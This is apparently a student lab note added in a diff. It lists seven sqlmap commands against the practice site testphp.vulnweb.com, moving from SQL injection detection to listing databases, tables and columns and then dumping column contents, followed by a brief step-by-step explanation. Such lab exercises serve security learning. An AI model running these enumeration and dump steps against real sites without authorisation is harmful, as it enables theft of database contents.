@@ -1,0 +1,29 @@
+Query 1:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1                                
+
+Query 2:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs                                 
+ 
+Query 3:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables                    
+
+Query 4:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns        
+
+Query 5:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C adesc --dump
+
+Query 6:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T categ --columns        
+
+Query 7:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T categ -C cdesc --dump
+
+Explanantion:
+After finding the vulnerable website we will open the sqlmap terminal in kali Linux. 
+We will write the first query to access the website on which we want to test sql injection attack. 
+The next sql query will retrieve the database of the website. In my case there were 2 databases. 
+Then we will write the query to access the particular database and the table of database. 
+It will display the name of tables. There were 8 tables in my query result. 
+Then we will write queries to fetch information from particular table with columns. 
+After retrieving the information from the website, we will store this information to a file by using dump command at the end.
